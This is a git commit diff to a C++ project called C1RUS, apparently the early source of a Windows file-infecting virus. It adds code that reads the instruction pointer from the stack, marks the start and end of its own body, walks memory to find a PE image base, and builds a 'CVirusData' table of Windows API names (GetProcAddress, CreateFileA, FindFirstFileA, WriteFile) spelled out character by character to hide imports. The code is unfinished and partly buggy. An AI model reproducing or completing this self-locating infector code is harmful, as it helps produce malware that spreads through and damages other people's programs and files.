687aa2d65fb1ee1c08ad787e91c5ff48e7bb90c0
XXXRef XXXRef <xxxref@xxxref.com>
2020-05-26 23:50:17 +0300

    1. Implemented some functions 2. Added some fields into main data object

--- C1RUS/C1RUS/main.cpp
+++ C1RUS/C1RUS/main.cpp
@@ -1,36 +1,81 @@
-#include <cstddef>
-
 #include "utils.hpp"
 
-std::size_t MARKER_BODYEND();
-std::size_t getEIP();
+#include <windows.h> //TODO Header can generate entities. Check it
 
-std::size_t MARKER_BODYBEGIN() {
-	std::size_t curEIP = getEIP();
-	const std::size_t offsetTillFuncBegin = 0x9;
+TYPE_SIZE getEIP();
+
+//====================================================================================================
+TYPE_SIZE MARKER_BODYBEGIN() {
+	TYPE_SIZE curEIP = getEIP();
+	const TYPE_SIZE offsetTillFuncBegin = 0x9;
 	return curEIP - offsetTillFuncBegin;
 }
 
-std::size_t getEIP() {
-	std::size_t stackCanary;
-	std::size_t* stackIter = &stackCanary;
-	//stack now:
-	//eip 2
-	//ebp 1
-	//stackCanary 0
-	//stackIter
+//====================================================================================================
+TYPE_SIZE getEIP() {
+	TYPE_SIZE stackCanary;
+	TYPE_SIZE* stackIter = &stackCanary;
 	return stackIter[3];
 }
 
-int main() {
-	std::size_t pVirusBodyBegin = MARKER_BODYBEGIN();
-	std::size_t pVirusBodyEnd = MARKER_BODYEND();
-
-	//instruction <-
+//====================================================================================================
+TYPE_SIZE MARKER_MARKEREXAMPLE() {
+	TYPE_SIZE curEIP = getEIP();
+	const TYPE_SIZE offsetTillFuncBegin = 0x9;
+	return curEIP - offsetTillFuncBegin;
 }
 
-std::size_t MARKER_BODYEND() {
-	std::size_t curEIP = getEIP();
-	const std::size_t offsetTillFuncEnd = 0x14;
+//====================================================================================================
+bool checkIsPE(TYPE_SIZE addr) {
+	if (((char*)addr)[0] != 'Z' && ((char*)addr)[1] != 'M') return false;
+	addr +=((_IMAGE_DOS_HEADER*)addr)->e_lfanew;
+	if (((char*)addr)[0] != 'P' && ((char*)addr)[1] != 'E') return false;
+	return true;
+}
+
+//====================================================================================================
+TYPE_SIZE getPEImageBase(TYPE_SIZE addressSomewhereInModule) {
+	addressSomewhereInModule &= 0xFFFF0000;
+	while (false == checkIsPE(addressSomewhereInModule)) { addressSomewhereInModule -= 0x10000; }
+	return addressSomewhereInModule;
+}
+
+int main() {
+	int i;
+	++i;
+	/*
+	TYPE_SIZE stackCanary;
+	TYPE_SIZE* stackIter = &stackCanary;
+
+	CVirusData dataObject;
+
+
+	TYPE_SIZE pVirusBodyBegin = MARKER_BODYBEGIN();
+	TYPE_SIZE pVirusBodyEnd = MARKER_BODYEND();
+
+	//Initializing functions names
+	//GetProcAddress
+	dataObject.funcname_GetProcAddress[0] = 'G';
+	dataObject.funcname_GetProcAddress[1] = 'e';
+	dataObject.funcname_GetProcAddress[2] = 't';
+	dataObject.funcname_GetProcAddress[3] = 'P';
+	dataObject.funcname_GetProcAddress[4] = 'r';
+	dataObject.funcname_GetProcAddress[5] = 'o';
+	dataObject.funcname_GetProcAddress[6] = 'c';
+	dataObject.funcname_GetProcAddress[7] = 'A';
+	dataObject.funcname_GetProcAddress[8] = 'd';
+	dataObject.funcname_GetProcAddress[9] = 'd';
+	dataObject.funcname_GetProcAddress[10] = 'r';
+	dataObject.funcname_GetProcAddress[11] = 'e';
+	dataObject.funcname_GetProcAddress[12] = 's';
+	dataObject.funcname_GetProcAddress[13] = 's';
+	dataObject.funcname_GetProcAddress[14] = '\0';
+	*/
+
+}
+
+TYPE_SIZE MARKER_BODYEND() {
+	TYPE_SIZE curEIP = getEIP();
+	const TYPE_SIZE offsetTillFuncEnd = 0x14;
 	return curEIP + offsetTillFuncEnd;
 }
--- C1RUS/C1RUS/utils.hpp
+++ C1RUS/C1RUS/utils.hpp
@@ -1,9 +1,36 @@
 #ifndef HEADER_UTILS
 #define HEADER_UTILS
 
+#define TYPE_SIZE unsigned
+
+constexpr TYPE_SIZE strlen1(const char* pBuf) {
+	TYPE_SIZE i = 0;
+	while (true) {
+		if (pBuf[i++] == '\0') break;
+	}
+	return i;
+}
+
+#define STRLENINC(x) strlen1(x)+1
+
+
 class CVirusData {
-
-
+public:
+	//Functions names
+	char funcname_GetProcAddress[STRLENINC("GetProcAddress")];
+	char funcname_CreateFileA[STRLENINC("CreateFileA")];
+	char funcname_ReadFile[STRLENINC("ReadFile")];
+	char funcname_SetFilePointer[STRLENINC("SetFilePointer")];
+	char funcname_WriteFile[STRLENINC("WriteFile") ];
+	char funcname_CloseHandle[STRLENINC("CloseHandle") ];
+	char funcname_LocalAlloc[STRLENINC("LocalAlloc") ];
+	char funcname_LocalFree[STRLENINC("LocalFree") ];
+	char funcname_FindFirstFileA[STRLENINC("FindFirstFileA") ];
+	char funcname_FindNextFileA[STRLENINC("FindNextFileA") ];
+	char funcname_GetLastError[STRLENINC("GetLastError") ];
+	char funcname_MessageBoxA[STRLENINC("MessageBoxA") ];
 };
+
+
 
 #endif
